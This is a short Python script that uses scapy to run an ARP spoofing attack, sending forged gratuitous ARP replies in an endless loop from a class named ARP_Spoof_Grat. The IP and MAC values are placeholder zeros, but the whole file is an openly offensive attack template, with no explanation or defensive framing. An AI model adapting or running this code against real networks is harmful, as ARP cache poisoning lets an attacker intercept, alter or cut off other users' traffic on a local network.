from scapy.all import *
class ARP_Spoof_Grat(object):
         def startSpoof(self):
             while(True):
                 send(ARP(op=2,psrc='0.0.0.0',pdst='0.0.0.0',hwsrc='00:00:00:00:00:00'))
                 send(ARP(op=2,psrc='0.0.0.0',pdst='0.0.0.0',hwsrc='00:00:00:00:00:00'))


grat=ARP_Spoof_Grat()
grat.startSpoof() #Start spoofing
